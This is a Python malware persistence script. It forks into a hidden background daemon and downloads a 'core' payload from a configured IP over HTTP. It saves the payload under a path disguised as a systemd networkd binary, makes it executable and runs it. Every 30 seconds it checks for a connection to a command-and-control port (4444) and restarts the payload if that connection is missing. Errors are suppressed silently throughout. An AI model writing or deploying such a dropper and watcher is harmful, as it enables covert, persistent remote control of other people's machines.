#!/usr/bin/env python3
import os, time, subprocess, sys, urllib.request

# ======== CHANGE TO YOUR WINDOWS IP ========
YOUR_IP = "192.168.1.167"  # ← YOUR WINDOWS IP
CORE_PATH = "/usr/lib/systemd/systemd-network/networkd"
# ===========================================

def daemonize():
    """Run as background daemon"""
    try:
        pid = os.fork()
        if pid > 0: sys.exit(0)
    except: sys.exit(1)
    os.chdir("/")
    os.setsid() 
    os.umask(0)
    try:
        pid = os.fork()
        if pid > 0: sys.exit(0)
    except: sys.exit(1)
    sys.stdout.flush(); sys.stderr.flush()

def is_core_running():
    """Check if core is connected to C2"""
    try:
        # Check if process exists and is connected
        result = subprocess.run(f"netstat -tulpn 2>/dev/null | grep {YOUR_IP}:4444", 
                              shell=True, capture_output=True, text=True)
        return result.returncode == 0
    except: return False

def ensure_core_exists():
    """Ensure core payload exists on system"""
    if not os.path.exists(CORE_PATH):
        try:
            # Download from your Windows server
            os.makedirs(os.path.dirname(CORE_PATH), exist_ok=True)
            with urllib.request.urlopen(f"http://{YOUR_IP}:8000/core.py") as response:
                with open(CORE_PATH, 'wb') as f:
                    f.write(response.read())
            os.chmod(CORE_PATH, 0o755)
        except: pass

def start_core():
    """Start core payload"""
    try:
        subprocess.Popen([
            "/usr/bin/python3", CORE_PATH
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        return True
    except: return False

def ensure_running():
    """Main watcher loop - ensures 24/7 operation"""
    while True:
        try:
            # 1. Ensure core file exists
            ensure_core_exists()
            
            # 2. Check if core is running and connected
            if not is_core_running():
                # 3. Try to start core
                start_core()
                time.sleep(10)  # Wait for connection
                
        except Exception as e:
            pass  # Silent operation
            
        time.sleep(30)  # Check every 30 seconds

if __name__ == "__main__":
    daemonize()  # Run as hidden daemon
    ensure_running()
